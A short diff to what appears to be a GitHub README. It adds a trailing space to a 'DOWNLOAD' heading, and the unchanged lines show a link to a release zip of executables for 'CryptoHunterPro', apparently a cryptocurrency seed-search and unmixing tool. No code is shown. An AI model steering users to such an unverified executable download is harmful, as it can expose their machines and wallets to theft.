@@ -1,4 +1,4 @@
-<h1 align="center">DOWNLOAD</h1>
+<h1 align="center">DOWNLOAD</h1> 
 
 <p align="center">
   <a href="https://github.com/henriquesmlourenco/CryptoHunterPro/releases/download/v2.0/Executaveis.CIE.e.Unmixer.Seed.Search.zip">
